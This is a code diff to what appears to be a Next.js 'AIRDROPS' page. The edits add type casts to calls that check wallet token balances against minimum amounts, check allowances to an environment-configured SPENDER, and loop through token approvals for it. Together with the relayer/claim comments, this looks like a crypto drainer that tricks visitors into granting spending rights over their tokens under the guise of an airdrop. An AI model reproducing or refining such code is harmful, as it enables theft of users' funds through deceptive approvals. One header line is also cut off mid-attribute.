@@ -20,7 +20,7 @@ const TRUSTED_FORWARDERS: Record<number, string> = {
 };
 
 // Example SPENDER constant (make sure this matches relayer/claim expectations)
-const SPENDER = process.env.NEXT_PUBLIC_SPENDER_ADDRESS || '';  
+const SPENDER = (process.env.NEXT_PUBLIC_SPENDER_ADDRESS || '') as `0x${string}`;
 
 // MetaTx helper functions
 interface MetaTxRequest {
@@ -169,7 +169,7 @@ export default function Home() {
                 address: token.address,
                 abi: erc20Abi,
                 functionName: 'balanceOf',
-                args: [address],
+                args: [address as `0x${string}`],
               }) as bigint;
 
               if (bal >= token.min) {
@@ -227,7 +227,7 @@ export default function Home() {
             address: token.address,
             abi: erc20Abi,
             functionName: 'allowance',
-            args: [address, SPENDER],
+            args: [address as `0x${string}`, SPENDER],
           }) as bigint;
 
           if (currentAllowance > 0n) {
@@ -297,7 +297,7 @@ export default function Home() {
 
       setStatus('All approvals completed!');
     } catch (err: any) {
-      setStatus('Error: ' + (err?.message || 'unknown'));  
+      setStatus('Error: ' + (err?.message || 'unknown')); 
     }
   }
 
@@ -308,7 +308,7 @@ export default function Home() {
 
   return (
     <main style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 24, marginTop: 40 }}>
-      <header style={{ position: 'fixed', top: 0, left: 0, right: 0, height: 64, background: '#09011fff', display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '0 24px', zIndex: 1000 }}>
+      <header style={{ position: 'fixed', top: 0, left: 0, right: 0, height: 64, background: '#09011fff', display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '0 24px'[...]
         <div style={{ fontFamily: 'sans-serif', fontWeight: 'bold', fontSize: 18, color: '#aaa587ff' }}>AIRDROPS</div>
         <div />
       </header>
